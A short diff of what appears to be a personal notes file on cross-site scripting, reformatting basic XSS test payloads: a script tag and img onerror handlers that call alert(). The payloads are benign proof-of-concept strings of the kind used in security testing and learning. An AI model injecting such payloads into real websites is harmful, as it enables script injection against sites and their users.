@@ -18,11 +18,11 @@ this will cause Content-Disposition to throw its content into the file
 
 
 
-<script>alert("xss")</script>
 
+- Basic
+`<script>alert("xss")</script>`
 `<img src="xss.gif" onerror="alert(1)">`
-
-`<img src="xss.gif" onerror="alert('xss')">`
+`<img src="xss.gif" onerror="alert('xss')">
 
 
 
